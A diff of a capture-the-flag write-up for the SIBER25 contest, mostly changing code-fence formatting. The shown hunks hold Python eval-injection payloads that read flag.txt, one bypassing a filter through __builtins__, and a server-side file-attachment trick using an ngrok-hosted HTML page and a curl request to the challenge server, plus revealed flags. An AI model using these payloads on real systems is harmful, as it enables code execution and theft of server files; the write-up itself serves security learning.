@@ -87,7 +87,7 @@ In the code, you can find critical things which are eval functions which can exe
 
 For this im trying different combinations to get the flag
 
-```
+```py
 [open('flag.txt').read()]
 f"{open('flag.txt').read()}"
 repr(open('flag.txt').read())
@@ -95,7 +95,7 @@ repr(open('flag.txt').read())
 
 Until i get this one 
 
-```
+```py
 __builtins__.__dict__['pr'+'int'](open('flag.txt').read())
 ```
 
@@ -134,10 +134,12 @@ To sum up, the program function like :
 - The program expects two 8-byte blocks per half (so each half becomes 16 bytes after processing); the two halves combined are the flag candidate.
 
 So, after you find the bytes, by using command: 
-```sh
+
+```bash
 xxd -p -l 8 r1        # prints 8 bytes as hex
 hexdump -C -n 8 r1    # format the output
 ```
+
 Then, you will get the flag : 
 
 >Flag: `SIBER25{n0w_y0u_l34rn_r3v3r53}`
@@ -213,11 +215,11 @@ I guess I'm pushing my luck again today.
 
 Given an apk file, so I'm using apktool (Sorry I'm just googling how to analyse apk files and apktool is one of the options) and in the command prompt i run this command to extract it.
 
-```sh
+```bash
 apktool d app-debug.apk
 ```
 
-After that, im opening vscode and just find SIBER25{
+After that, im opening vscode and just find `SIBER25{`
 
 ![](assets/img/siber-siaga-25/image11.png)
 
@@ -232,7 +234,9 @@ Sorry for unintended solution 🙏
 
 Recently, our AI Tech Support behaved strangely. During investigation, we discovered two odd files on the culprit device are identical to a suspicious file from our server. We suspect something malicious is hidden inside the image itself, but we couldn’t see it directly. Can you figure out how to uncover what’s within the image that can only be seen by AI?
 
-Flag Format: SIBER25{flag} Challenge Creator: @penguincat
+Flag Format: SIBER25{flag} 
+
+Challenge Creator: @penguincat
 
 **Answer:**
 
@@ -574,21 +578,25 @@ Create an html that attaches local file (flag)
 The twist here is that we can only supply URL to the server. Thus, hosting or just proxy our local server to be accessible to the server is enough here. 
 
 Host on anywhere for the server to fetch (i used ngrok)
+
 ```bash
 Python -m http.server 8080 && ngrok http 8080
 ```
 
 Then, Send the link to the server to fetch and download the resulting pdf
+
 ```bash
 curl -X POST -d "url=https://a0e6375f976e.ngrok-free.app/test.html" "http://5.223.49.127:27002/" -o flag_result.pdf
 ```
 
 With the file, Extract flag from the pdf
+
 ```bash
 pdf –saveall flag_result.pdf
 ```
 
 After extracting, Extract text from the flag.txt to obtain the flag.
+
 ```bash
 cat flag.txt
 ```
